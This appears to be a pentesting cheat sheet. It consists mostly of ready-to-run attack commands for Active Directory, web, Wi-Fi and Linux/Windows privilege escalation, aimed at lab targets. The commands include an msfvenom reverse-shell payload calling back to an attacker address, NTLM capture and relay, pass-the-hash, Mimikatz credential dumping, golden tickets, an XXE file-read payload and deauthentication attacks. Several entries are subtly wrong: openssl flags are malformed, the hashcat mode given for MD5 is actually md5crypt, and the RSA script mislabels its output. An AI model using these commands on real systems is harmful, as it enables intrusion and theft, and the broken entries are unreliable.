# Table of contents

1. [Misc](#Misc)
2. [Active Directory Initial Attack Vectors](#Active-Directory-Initial-Attack-Vectors)
3. [Active Directory Enumeration](#active-directory-enumeration)
4. [Active Directory Post-Compromise Attacks](#active-directory-post-compromise-attacks)
5. [Web Application Enumeration](#web-application-enumeration)
6. [XML External Entities (XXE)](#xml-external-entities-(xxe))
7. [Cross Site Scripting (XSS)](#cross-site-scripting-(xss))
8. [Wifi Hacking](#wifi-hacking)
9. [Windows Privilege Escalation](#windows-privilege-escalation)
10. [Linux Privilege Escalation](#linux-privilege-escalation)
11. [SMTP](#smtp)
12. [SSH](#ssh)
13. [Word Press](#word-press)
14. [RSA](#rsa)

<sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>

# Misc

---

## Fix VPN routing issue (same subnet)

```bash
fixvpn='sudo route del -net 10.10.10.0 gw 10.10.14.1 netmask 255.255.255.0 dev tun0'
```

## SimpleHTTPServer

```bash
python -m SimpleHTTPServer
```

```bash
python3 -m http.server 8080
```

## Upgrade Reverse Shell

1. ``` Ctrl+z``` to background session
2. ``` stty raw -echo```
3. ```fg``` to foreground session again

## Switch User without providing Password

```bash
sudo -u scriptmanager bash -i
```

## Portscanning

``` bash
nmap -sC -sV -oA outfile 192.168.1.0/24
```

```bash
for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done
```



## Crack MD5 Hash

```bash
hashcat -m 500 hash rockyou.txt
```

```bash
hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
```

## Password List

:information_source: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

## Web Enumeration

```bash
gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
```

## DNS Recon

``` bash
dnsrecon -r 127.0.0.1/24 -n <IP of DNS Server>
```

## PHP Reverse Shell

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
```

## Brute Forcing
### hydra

```bash
hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
```

Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
### wfuzz

``` bash
wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
```

## SSL
### Check if Private Key matches Certificate

```bash
openssl x509 -noout in serct.crt | md5sum
```

```bash
openssl rsa -noout in key.key | md5sum	
```

### Generate new Private Key and Certificate Signing Request (CSR)

```bash
openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout key.key
```

### Generate a self-signed Certificate

```bash
openssl req -x509 -sha256 -nodes -day 365 -newkey rsa:2048 -keyout key.key -out crt.crt
```

# Active Directory Initial Attack Vectors

---

## Capturing NTLM net-Hashes with Responder

:information_source: Default configuration in windows is always fall back to LLMNR if DNS resolving fails. LLMNR broadcasts its request to the whole network.

```sequence
Victim->DNS Server: Who is "fileservrr"
DNS Server->Victim: I don't know
Victim->Network: Anyone knows who "fileservrr" is?
Attacker->Victim: Yes, this is me
Victim->Attacker: I would like to log in
Attacker->Victim: OK, encrypt this challenge with your password hash
Victim->Attacker: Sends encrypted challenge
Attacker->Victim: Sorry, something went wrong
```

``` bash
responder -I eth0 -rdwv

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.92.129
[SMB] NTLMv2-SSP Username : WHITEROSE\ealderson
[SMB] NTLMv2-SSP Hash     : ealderson::WHITEROSE:af77856ba3332f51:B81BF48A67FE909F054D588DF1345C6A:0101000000000000C0653150DE09D2012BC03559A3DFA755000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000F279BA7D9D36AB76937A31505A3A023E63ECAF17A4F311B0E248705A3CB09B9A0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100330033000000000000000000
```

## Crack NTLMv2 Net-Hashes with hashcat

1. Get module number of NTLM hash with 

   ``` bash
   hashcat --example-hashes | grep NTLM -C 4
   ```

2. Crack Hash

   ``` bash
   hashcat -m 5600 hashes.txt rockyou.txt 
   ```

## SMB Relay Attack

:warning: This does not work if SMB Signing is required. 

:warning: The relayed user needs to be a local administrator on target machine to dump the SAM hashes.

Disable SMB in ```/etc/responder/Responder.conf``` and run:

``` bash
responder -I eth0 -rdwv
```

Open a second terminal and run:

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

## Shell Access with Credentials

:information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.

``` bash
psexec.py whiterose.local/ealderson:Password!@192.168.92.129
```

## IPv6 Attacks

:information_source: ​Only possible if IPv6 is enabled and no DNS Server is defined for IPv6. In this case we may get NTLM net-Hashes and can relay those to authenticate (see SMB Relay Attack). Details: 

[Combining NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

[mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

:information_source: Make sure mitm6 is installed. If not, install it with: ``` sudo pip3 install mitm6 ```

``` bash
mitm6 -d whiterose.local
```

Open a second terminal and run:

```bash
ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfile
```

:information_source: ``` --delegate-access ``` 

# Active Directory Enumeration

-----

## PowerView

:information_source: [sourcecode](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

:information_source: [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

1. Bypass execution policy

```
powershell -ep bypass
```

2. Use PowerView

```
. .\PowerView.ps1
```

3. Start enumerating. Examples:

```
Get-NetDomain
```

```
Get-NetDomainControllers
```

```
Get-DomainPolicy
```

```
{Get-DomainPolicy}."system access"
```

```
Get-NetUser
```

```
Get-NetUser | select cn
```

```
Get-NetUser | select samaccountname
```

```
Get-UserProperty
```

```
Get-UserProperty -Properties pwdlastset
```

```
Get-NetComputer -FullData
```
```
Get-NetGroup
```

```
Get-NetGroupMember -GroupName "Domain Admin"
```

```
Invoke-ShareFinder
```

```
Get-NetGPO | select displayname, whenchanged
```

:information_source: Detect possible honey accounts with:

```
Get-UserProperty -Properties logoncount
```

## Bloodhound

:information_source: [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) 				

:information_source: [Data-Collector](https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector) 

On host run:

```
powershell -ep bypass
```

```
. .\SharpHound.ps1
```

```
Invoke-Bloodhound -CollectionMethod All -Domain WHITEROSE.local -ZipFileName file.zip 
```

Transfer the zip file to kali instance and load it into bloodhound to visualize.

:information_source: Install bloodhound using apt
:information_source: bloodhound depends on neo4j

# Active Directory Post-Compromise Attacks
---

## Pass The Password

:information_source: install crackmapexec using apt
:information_source: keep lockout policy in mind

You can spray credentials in an AD network using crackmapexec:

```bash
crackmapexec 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
```

## Dumping Hashes With secretsdump.py

:information_source: secretsdump.py is part of the impacket toolkit

```bash
secretsdump.py whiterose/ealderson:Password123@192.168.92.131
```

## Pass The Hash

Use NTHASH (LMHASH:NTHASH)

```bash
crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
```

## Shell Access Whith NTLM Hash

```bash
psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
```

## Token Impersonation

Get a meterpreter session (e.g. smb/psexec).

```bash
meterpreter> load incognito
meterpreter> list tokens
meterpreter> impersonate_token marvel\\administrator
```

## Kerberoasting

:information_source: GetUserSPNs.py is part of the impacket toolkit

### Kerberos in a nutshell

```sequence
User->Domain Controller: 1. Request TGT, Provide NTLM hash
Domain Controller->User: 2. Receive TGT enc. w. krbtgt hash
User->Domain Controller: 3. Request TGS for Server (Presents TGT)
Domain Controller->User: 4. Receive TGS enc. w. servers account hash
User->Application Server: 5. Presents TGS for service enc. w. servers account
Application Server->Domain Controller: (opt.) PAC Validation request
Domain Controller->Application Server: (opt.) PAC Validation response
```



### Approach: Crack the servers account hash

```
GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
```

## cPassword / Group Policy Preferences (GPP) Attacks

:information_source: GPP's allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a 'cPassword'. The key was accidentally released. Patched with MS14-025 but does not prevent the previous uses. If the policy was set before this was patched. [Blogpost](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

:information_source: Check if vulnerable with metasploit using smb_enum_gpp.

:information_source: You can test this attack using the retired machine 'Active' on HackTheBox

Get Groups.xml from SYSVOL or \Replication share and check for cPassword.

```bash
gpp-decrypt <cPassword-Hash>
```

## Mimikatz

[Github Page](https://github.com/gentilkiwi/mimikatz)

:information_source: Tool used to view and steal credentials, generate kerberos tickets, leverage attacks and dump credentials stored in memory. Not working every time due to cat and mouse game between developers and windows.

### Dump Hashes 

Run mimikatz on DC and run the following commands to dump hashes.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam 
mimikatz # lsadump::sam /patch
mimikatz # lsadump::lsa /patch
```

### Golden Ticket Attack

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

Copy S-ID of the domain and NTLM hash of TGT-Account.

```
mimikatz # kerberos::golden /User:Administrator /domain:whiterose.local /sid:S-1-5-21-301242389-3840584950-2384549833 /krbtgt:64f12cdda88057e06a81b54e73b949b /id:500 /ptt
mimikatz # misc::cmd
```

# Web Application Enumeration

---

Install golang and add the following two lines to ~/.bashrc (or ~/.profiles)

```bash
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin		
```

## [Assetfinder](https://github.com/tomnomnom/assetfinder)

```bash
go get -u github.com/tomnomnom/assetfinder
```

:information_source: also see [amass](https://github.com/OWASP/Amass)

## [Httprobe](https://github.com/tomnomnom/httprobe) (find alive domains)

```bash
go get -u github.com/tomnomnom/httprobe
```

## [GoWitness](https://github.com/sensepost/gowitness) (Screenshotting Websites)

```bash
go get -u github.com/sensepost/gowitness
```

# XML External Entities (XXE)

---

Basic idea: upload an xml to test if it gets parsed and then abusing the doctype definition (DTD).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

# Cross Site Scripting (XSS)

---

:information_source: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)

:information_source: https://www.scip.ch/en/?labs.20171214 

:information_source: https://xss-game.appspot.com/

# Wifi Hacking

---

## WPS Pin Recovery
```bash
reaver -i wlan0mon -b 9C:AD...(network-target-mac) -c 1 (channel 1) -f (fixed:one channel) -a -w(win7 register art) -v (verbose) -K 1 (Pixie-attack: hit common pins)
#if Pixie (-K 1 doesnt work, run -vv (very verbose))
```

## Capture WPA/WPA2 Handshake
```bash
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```
```bash
airmon-ng
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```
```bash
airodump-ng wlan0mon [--bssid F0:7B.... where F0:7B.. is mac of "target-router"][--channel 11][--write Desktop/path/to/my/file]
```
```bash
aireplay-ng wlan0mon [--deauth 2000 (sending 2000 deauth packages)][-a F0:7B.. (-a: Accesspoint:Macadress of router)][-c F9:2D..(-c:Client: Macadress of target)]
#sending deauth packages to force a handshake
```

## Crack WPA/WPA2 Handshake

```bash
aircrack-ng Path/to/my/captureFile/with/handshake.cap -w /Path/to/my/password/list.txt
```

# Windows Privilege Escalation

## [Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

## System Enumeration
```
systeminfo
hostname
tasklist
wmic qfe
wmic logicaldisk get caption,description,providername
```

## User Enumeration
```
whoami
whoami /priv
whoami /groups
net user 
net user Administrator
net localgroup
net localgroup Administrators
```

## Network Enumeration
```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

## Password Hunting
```
findstr /si password *.txt *.ini *.config
```
## 

## AV and FW Enumeration
```
sc query windefend
sc queryex type= service # Show all services
netsh advfirewall firewall dump
firewall show state
netsh firewall show config
```

## Automated Enumeration Tools
### Executables
* [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
* [Wason.exe](https://github.com/rasta-mouse/Watson)
* [SharpUp.exe](https://github.com/GhostPack/SharpUp)

### PowerShell
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 
* [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
* [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [jaws-enum.ps1](https://github.com/411Hall/JAWS)

### Other
* [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

## [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Potato Attacks
* [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Juicy Potato](https://github.com/ohpe/juicy-potato)


# Linux Privilege Escalation
## LinEnum
Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 

## Setuid bits
``` 
# Find SUID files
find / -user root -perm -4000 2>/dev/null
# Set UID bit
chmod u+s /script
```

### Example (node@htb)
* User with higher privilege (tom) runs a scheduled task (/var/schedulder/app.js) which reads commands (cmd) from a mongo database (tasks) and executes them.
```
mark@node:~$ mongo -p -u mark scheduler # the scheduler script revealed authSource=scheduler
> db.tasks.insert( { "cmd" : "cp /bin/bash /tmp/manununu; chown tom:admin /tmp/manununu; chmod u+s /tmp/manununu; chmod g+s /tmp/manununu;" } )
> db.tasks.find()
{ "_id" : ObjectId("5f268f230bc897a5c9442b54"), "cmd" : "cp /bin/bash /tmp/manununu; chmod u+s /tmp/manununu;" }

mark@node:~$ ls -la /tmp/manununu
-rwsr-sr-x 1 tom tom 1037528 Aug  2 10:42 /tmp/manununu

mark@node:~$ /tmp/manununu -p # -p priviliged    Do not attempt to reset effective uid if it does not match uid.
manununu-4.3$ whoami
tom
```

# SMTP
## Extract Mails from Server using Telnet (Authenticated, IMAP)
```
a1 LOGIN <usename> <password>
a2 LIST '' '*'
a3 EXAMINE INBOX
a4 FETCH 1 BODY[]
a5 FETCH 2 BODY[]
```
# SSH
## Crack Passphrase for given SSH-Key
* [John The Ripper](https://github.com/openwall/john)
* [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
```
python3 ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=<wordlist>
```

# Word Press
## wpscan
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```

# RSA
## Given: q, p, and e values for an RSA key, along with an encrypted message
The following script can be found [here](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). It is using the extended eucledian algorithm for calculating the modulus inverse.

``` python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```



